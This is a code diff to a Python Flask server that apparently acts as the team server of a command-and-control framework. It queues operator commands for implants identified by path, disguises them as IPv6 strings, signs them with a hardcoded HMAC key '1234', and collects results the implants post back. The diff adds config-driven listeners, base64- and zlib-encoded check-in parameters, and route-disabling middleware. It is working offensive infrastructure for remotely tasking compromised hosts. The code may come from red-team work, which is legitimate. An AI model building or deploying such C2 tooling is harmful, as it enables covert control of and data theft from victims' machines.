@@ -1,7 +1,10 @@
+import base64
+import binascii
 import hashlib
 import hmac
 import json
 import logging
+import urllib
 import zlib
 import random
 import socket
@@ -13,7 +16,7 @@ from queue import Queue, Empty
 from threading import Thread
 import secrets
 
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, abort
 
 import ipv6_encoder
 import pw_hash
@@ -51,16 +54,61 @@ logging.basicConfig(
     datefmt='%Y-%m-%d %H:%M:%S',
 )
 
+# Load the default config file
+with open('s_conf.json', 'r') as file:
+    config = json.load(file)
 
-def decompress_data(compressed_hex_data):
+# Get the listener names from the config file and add them to a list
+listeners_list = config["listeners"]
+# Then form a dict with the listener name and their enabled state
+route_status = {}
+for listener in config["listeners"]:
+    name = listener['name']
+    path = listener['path']
+    method = listener['method']
+    # Ensure we only store the enabled/disabled status for each method on the same path
+    if path not in route_status:
+        route_status[path] = {}
+    if name not in route_status[path]:
+        route_status[path][name] = {}
+    route_status[path][name][method] = listener['enabled'].lower() == "true"  # Store as True or False
+print(route_status)
+
+
+def find_get_val(req_meth):
     """
-    Decompress data using zlib
-    :param compressed_hex_data: The data to decompress
-    :return: Plaintext version of input data
+    A dirty function to search a dictionary for the method and status
+    :param req_meth: The request method
+    :return: Bool
     """
-    compressed_data = bytes.fromhex(compressed_hex_data)
-    decompressed_data = zlib.decompress(compressed_data)
-    return decompressed_data.decode('utf-8')
+    stack = [route_status]
+
+    while stack:
+        current_dict = stack.pop()
+
+        for key, value in current_dict.items():
+            if isinstance(value, dict):
+                stack.append(value)
+            elif key == req_meth and value is False:
+                return True
+    return False
+
+
+def endi_listener(listener_name, status):
+    """
+    Enable or disable a listener by name
+    :param listener_name: The listener to set to True or False
+    :param status: Set the listener to True/False
+    :return: Bool
+    """
+    for search_path, listeners in route_status.items():
+        for search_name, methods in listeners.items():
+            if search_name == listener_name:
+                for search_method in methods.keys():
+                    # Update the method status to the given status
+                    route_status[search_path][search_name][search_method] = status.lower() == "true"
+                    return f"Listener {listener_name} set to {status} for {search_method} method."
+    return f"Error: Listener {listener_name} not found."
 
 
 def verify_auth_token(uri, received_token, received_timestamp):
@@ -334,139 +382,117 @@ def handle_client(client_socket):
         client_socket.close()
 
 
-@app.route('/auth/<path:path>', methods=['GET'])
-def authenticated_get(path):
+# Store a mapping of route functions so that they can be refreshed
+route_functions = {}
+
+
+def register_routes():
     """
-    Verifies requests for commands with an HMAC and shared key
-    :param path: This represents the implant ID
-    :return: Either the waiting command or error
+    Dynamically register routes based on their enabled state
+    Initial default route names are retrieved from the s_conf.json file
     """
-    rcv_token = request.args.get("token")
-    rcv_timestamp = request.args.get("timestamp")
-    # Get the message FIFO
-    logger.info("GET incoming for authenticated listener URI")
-    if verify_auth_token(path, rcv_token, rcv_timestamp) is True:
+    global route_functions
+
+    @app.route(listeners_list[0]['path'], methods=['GET'])
+    def def_endpoint1(path):
+        """
+        Verifies requests for commands with an HMAC and shared key
+        :param path: This represents the implant ID
+        :return: Either the waiting command or error
+        """
+        logger.info("GET incoming for authenticated listener URI")
         try:
-            operator, command = get_waiting_command(path)
-            if operator and command is False:
-                logger.error("operator and command in queue returned as false")
+            logger.info("looks like an encoded request")
+            url_decoded_data = urllib.parse.unquote(request.args.get("da"))
+            url_decoded_data = url_decoded_data.rstrip("=")  # Remove existing padding
+            padding = len(url_decoded_data) % 4
+            if padding:
+                url_decoded_data += "=" * (4 - padding)  # Add necessary padding
+
+            compressed_data = base64.b64decode(url_decoded_data)
+            decompressed_data = zlib.decompress(compressed_data)
+            unparsed_query = decompressed_data.decode('utf-8')
+            parsed_data = urllib.parse.parse_qs(unparsed_query)
+
+            rcv_timestamp = parsed_data.get('timestamp')
+            rcv_token = parsed_data.get('token')
+            if verify_auth_token(path, rcv_token[0], rcv_timestamp[0]) is True:
+                operator, command = get_waiting_command(path)
+                if operator and command is False:
+                    logger.error("operator and command in queue returned as false")
+                    return "error"
+                checkout_command(path, operator)
+                command = json.dumps(ipv6_encoder.string_to_ipv6(command))
+                logger.info("sending command and HMAC to implant")
+                hmac_k = hmac.new("1234".encode(), command.encode(), hashlib.sha256)
+                hmac_sig = hmac_k.hexdigest()
+                return jsonify(
+                    message=command,
+                    key=hmac_sig
+                )
+            else:
+                logger.error(f"error: verify_auth_token failed")
                 return "error"
-            checkout_command(path, operator)
-            command = json.dumps(ipv6_encoder.string_to_ipv6(command))
-            logger.info("sending command and HMAC to implant")
-            hmac_k = hmac.new("1234".encode(), command.encode(), hashlib.sha256)
-            hmac_sig = hmac_k.hexdigest()
-            return jsonify(
-                message=command,
-                key=hmac_sig
-            )
         except Exception as e:
-            logger.error(f"error: {e}")
+            logger.info(f"{e} occurred")
+            rcv_timestamp = request.args.get('timestamp')
+            rcv_token = request.args.get('token')
+            if verify_auth_token(path, rcv_token, rcv_timestamp) is True:
+                operator, command = get_waiting_command(path)
+                if operator and command is False:
+                    logger.error("operator and command in queue returned as false")
+                    return "error"
+                checkout_command(path, operator)
+                command = json.dumps(ipv6_encoder.string_to_ipv6(command))
+                logger.info("sending command and HMAC to implant")
+                hmac_k = hmac.new("1234".encode(), command.encode(), hashlib.sha256)
+                hmac_sig = hmac_k.hexdigest()
+                return jsonify(
+                    message=command,
+                    key=hmac_sig
+                )
+            else:
+                logger.info("verifying auth failed")
+                return 404
+
+
+    @app.route(listeners_list[1]['path'], methods=['POST'])
+    def def_endpoint2(path):
+        try:
+            logger.info(f"{path} sending us data")
+            # Get the data
+            result = request.get_json()
+            # The result comes in as a JSON object under the field msg
+            result = result.get("msg")
+            # Check which operator is waiting for a result
+            queue = implant_checkout[path]
+            logger.info("got queue for operator")
+            operator = queue.get()
+            logger.info(f"sending {operator} command")
+            handle_update(operator, path, result)
+            return "200"
+        except Exception as e:
+            logger.error(f"error getting data: {e}")
             return "error"
-    else:
-        logger.error(f"error: verify_auth_token failed")
-        return "error"
+
+    # Save the function references
+    route_functions[listeners_list[0]['name']] = def_endpoint1
+    route_functions[listeners_list[1]['name']] = def_endpoint2
 
 
-@app.route('/direct/<path:path>', methods=['GET'])
-def http_get(path):
-    """
-    Handles implants skipping the CF Worker and using basic HTTP for check-in
-    :param path: This represents the implant ID
-    :return: Either the waiting command or error
-    """
-    # Get the message FIFO
-    logger.info("GET incoming for basic HTTP listener URI")
-    try:
-        operator, command = get_waiting_command(path)
-        if operator and command is False:
-            logger.error("error")
-            return "error"
-        checkout_command(path, operator)
-        command = json.dumps(ipv6_encoder.string_to_ipv6(command))
-        logger.info("sending command and HMAC to implant")
-        hmac_k = hmac.new("1234".encode(), command.encode(), hashlib.sha256)
-        hmac_sig = hmac_k.hexdigest()
-        return jsonify(
-            message=command,
-            key=hmac_sig
-        )
-    except Exception as e:
-        logger.error(f"error: {e}")
-        return "error"
+# Register routes initially
+register_routes()
 
 
-@app.route('/<path:path>', methods=['GET'])
-def catch_all_get(path):
-    """
-    Handles the CF JS worker script getting waiting commands in IPv6 format
-    :param path: This represents the implant ID
-    :return: Either the waiting command or error
-    """
-    # Get the message FIFO
-    logger.info("GET incoming for DNS URI path")
-    try:
-        operator, command = get_waiting_command(path)
-        if operator and command is False:
-            logger.error("error")
-            return "error"
-        checkout_command(path, operator)
-        logger.info("sending IPv6 encoded command to CF worker")
-        return ipv6_encoder.string_to_ipv6(command)
-    except Exception as e:
-        logger.error(f"error: {e}")
-        return "error"
-
-
-@app.route('/<path:path>', methods=['POST'])
-def catch_all_post(path):
-    """
-    Implants either directly or through the CF worker send results here
-    POSTS come in as JSON, need a msg field
-    Will eventually probably also use the HMAC to verify authenticity
-    :param path: This represents the implant ID
-    :return: Either 200 or error
-    """
-    try:
-        logger.info(f"{path} sending us data")
-        # Get the data
-        result = request.get_json()
-        # The result comes in as a JSON object under the field msg
-        result = result.get("msg")
-        # Check which operator is waiting for a result
-        queue = implant_checkout[path]
-        logger.info("got queue for operator")
-        operator = queue.get()
-        logger.info(f"sending {operator} command")
-        decoded_res = ipv6_encoder.ipv6_to_string(result.split("\n"))
-        handle_update(operator, path, decoded_res)
-        return "200"
-    except Exception as e:
-        logger.error(f"error getting data: {e}")
-        return "error"
-
-
-@app.route('/un/<path:path>', methods=['POST'])
-def unencoded_post(path):
-    """
-    """
-    try:
-        logger.info(f"{path} sending us data")
-        # Get the data
-        result = request.get_json()
-        # The result comes in as a JSON object under the field msg
-        result = result.get("msg")
-        # Check which operator is waiting for a result
-        queue = implant_checkout[path]
-        logger.info("got queue for operator")
-        operator = queue.get()
-        logger.info(f"sending {operator} command")
-        # decoded_res = ipv6_encoder.ipv6_to_string(result.split("\n"))
-        handle_update(operator, path, result)
-        return "200"
-    except Exception as e:
-        logger.error(f"error getting data: {e}")
-        return "error"
+@app.before_request
+def restrict_routes():
+    """Middleware to block disabled routes."""
+    logger.info(f"checking if route is enabled: {request.path} {request.method}")
+    # Check if the request path matches a disabled route
+    if request.url_rule.rule in route_status:
+        if find_get_val(request.method):
+            logger.warning(f"disabled route accessed: {request.path} {request.method}")
+            abort(404)  # Return a 404 if the route is disabled
 
 
 def start_flask():
